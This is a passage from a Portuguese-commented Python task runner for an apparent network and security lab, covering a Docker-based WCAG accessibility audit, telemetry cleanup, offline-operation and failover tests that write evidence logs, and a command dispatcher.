        "fica fora do versionamento (infra/ota/out, no .gitignore).",
        "### Log de verificação (pacote íntegro, adulterado e assinado por chave não confiável)\n"
        + r.stdout.strip(),
    ]
    salvar_evidencia("B34_ota.txt", blocos)

def cmd_wcag(acao: str = "all") -> None:
    cred = credenciais_painel()
    u, senha, secret = cred.get("coordenacao") or next(iter(cred.values()))
    saida = INFRA / "wcag" / "out"
    saida.mkdir(parents=True, exist_ok=True)
    run(["docker", "build", "-q", "-t", "vila/wcag:1", str(INFRA / "wcag")], check=False)
    r = run(["docker", "run", "--rm", "--network", "vila_ops",
             "-e", "PAINEL_URL=http://10.30.2.20:8000", "-e", f"USUARIO={u}",
             "-e", f"SENHA={senha}", "-e", f"TOTP_SECRET={secret}",
             "-e", "SAIDA=/saida", "-v", f"{saida}:/saida", "vila/wcag:1"],
            check=False, capture=True)
    print(r.stdout)
    if r.stderr.strip():
        print(r.stderr)
    blocos = [
        "Auditoria de acessibilidade WCAG 2.1 AA do painel corrigido com axe-core (mesmo motor do "
        "pa11y/Lighthouse), em Chromium headless, autenticando com usuario + senha + TOTP.",
        "### Relatorio por pagina (violacoes por impacto)\n" + r.stdout.strip(),
    ]
    salvar_evidencia("B33_wcag.txt", blocos)


def cmd_limpar_telemetria() -> None:
    for site in SITES:
        run(compose_edge(site, "rm", "-sf", "agent"), check=False)
        run(["docker", "volume", "rm", f"vila-edge-{site}_outbox"], check=False)
    print(psql("DROP TABLE IF EXISTS telemetria"))
    print("Filas dos agentes e tabela telemetria apagadas. Rode: python tasks.py up")


def cmd_teste_local(site: str, minutos: float) -> None:
    site = "ubs" if site == "all" else site
    cenario = CENARIO_PADRAO[site]
    inicio = datetime.now().astimezone().isoformat(timespec="seconds")
    blocos = [f"Início: {inicio} | espaço: {site} | queda total (fibra + 4g) por {minutos} min | cenário: {cenario}"]
    link(site, "tudo", "down")
    time.sleep(10)
    cmd_cenario(site, cenario)
    fim = time.time() + minutos * 60
    while time.time() < fim:
        time.sleep(30)
        st = json.loads(status_agente(site) or "{}")
        linha = (f"{datetime.now().astimezone().isoformat(timespec='seconds')} | hub online: {st.get('hub_online')} | "
                 f"fila pendente: {st.get('fila_pendente')} | alarmes ativos: {len(st.get('alarmes_ativos', []))}")
        print(linha)
        blocos.append(linha)
    blocos.append("### Status do agente DURANTE a queda\n" + status_agente(site))
    cmd_cenario(site, "normal")
    link(site, "tudo", "up")
    print("Links restabelecidos; aguardando reconciliação (60 s)...")
    time.sleep(60)
    blocos.append("### Status do agente DEPOIS da reconciliação\n" + status_agente(site))
    blocos.append("### Log do agente\n" + logs_recentes(f"{site}-agent", f"{int(minutos * 60 + 120)}s"))
    blocos.append("### Log do túnel da borda\n" + logs_recentes(f"{site}-vpn", f"{int(minutos * 60 + 120)}s"))
    blocos.append("### Perda de dados no hub (lacunas de seq desde o início do teste)\n" + psql(lacunas_sql(site, inicio)))
    for b in blocos[-5:]:
        print(b)
    salvar_evidencia(f"B08_operacao_local_{site}.txt", blocos)


def cmd_failover(site: str) -> None:
    site = "ubs" if site == "all" else site
    inicio = datetime.now().astimezone().isoformat(timespec="seconds")
    blocos = [f"Início: {inicio} | espaço: {site} | queda da fibra; 4g continua disponível"]
    link(site, "fibra", "down")
    print("Fibra derrubada; aguardando o failover (45 s)...")
    time.sleep(45)
    blocos.append("### Status do agente com a fibra fora\n" + status_agente(site))
    link(site, "fibra", "up")
    print("Fibra restabelecida; aguardando o retorno (45 s)...")
    time.sleep(45)
    blocos.append("### Log do túnel da borda\n" + logs_recentes(f"{site}-vpn", "120s"))
    blocos.append("### Log do hub-vpn\n" + logs_recentes("hub-vpn", "120s"))
    blocos.append("### Log do agente\n" + logs_recentes(f"{site}-agent", "120s"))
    blocos.append("### Perda de dados no hub\n" + psql(lacunas_sql(site, inicio)))
    for b in blocos[1:]:
        print(b)
    salvar_evidencia(f"B09_failover_{site}.txt", blocos)


def main() -> None:
    os.chdir(ROOT)
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help", "help"):
        print(__doc__)
        return
    cmd, arg = sys.argv[1], (sys.argv[2] if len(sys.argv) > 2 else "all")
    match cmd:
        case "check":  cmd_check()
        case "init":   cmd_init()
        case "sysctl": cmd_sysctl()
        case "pull":   cmd_pull()
        case "up":     cmd_up(arg)
        case "down":   cmd_down(arg)
        case "status": cmd_status()
        case "logs":   cmd_logs(arg)
        case "ntp":    cmd_ntp()
        case "data":   cmd_data()
        case "mqtt":   cmd_mqtt(arg)
        case "pki":    cmd_pki()
        case "wg":     cmd_wg()
        case "vpn":    cmd_vpn()
        case "agente": cmd_agente(arg)
        case "failover": cmd_failover(arg)
        case "limpar-telemetria": cmd_limpar_telemetria()
        case "acesso": cmd_acesso()
        case "totp":   cmd_totp()
        case "bastion": cmd_bastion("shell" if arg == "shell" else "teste")
        case "segmentacao": cmd_segmentacao()
        case "varredura": cmd_varredura()
        case "ponte":  cmd_ponte()
        case "firewall": cmd_firewall()
        case "painel": cmd_painel(arg)
        case "sqli":   cmd_sqli()
        case "reteste": cmd_reteste()
        case "waf":    cmd_waf()
        case "rbac":   cmd_rbac()
        case "dns":    cmd_dns(arg)
        case "phishing": cmd_phishing(arg)
        case "siem":   cmd_siem(arg)
        case "deteccao": cmd_deteccao(arg)
        case "soar":   cmd_soar(arg)
        case "incidente": cmd_incidente(arg)
        case "forense": cmd_forense(arg)
        case "anomalia": cmd_anomalia(arg)
        case "llm":    cmd_llm(arg)
        case "caos":   cmd_caos(float(sys.argv[2]) if len(sys.argv) > 2 else 45)
        case "metricas": cmd_metricas(arg)
        case "ripd":   cmd_ripd(arg)
        case "ota":    cmd_ota(arg)
        case "wcag":   cmd_wcag(arg)
        case "teste-local":
            cmd_teste_local(arg, float(sys.argv[3]) if len(sys.argv) > 3 else 3)
        case "link":
            if len(sys.argv) < 5:
                print("Uso: python tasks.py link <espaço> <fibra|4g|tudo> <down|up>")
                sys.exit(1)
            cmd_link(sys.argv[2], sys.argv[3], sys.argv[4])
        case "certs":  cmd_certs(arg)
        case "intruso": cmd_intruso(arg)
        case "revogar" | "rotacionar":
            if len(sys.argv) < 3:
                print(f"Uso: python tasks.py {cmd} <dispositivo>")
                sys.exit(1)
            (cmd_revogar if cmd == "revogar" else cmd_rotacionar)(sys.argv[2])
        case "cenario":
            if len(sys.argv) < 4:
                print("Uso: python tasks.py cenario <espaço> <tipo>")
                sys.exit(1)
            cmd_cenario(sys.argv[2], sys.argv[3])
        case _:
            print(f"Comando desconhecido: {cmd}\n{__doc__}")
            sys.exit(1)


if __name__ == "__main__":
    main()
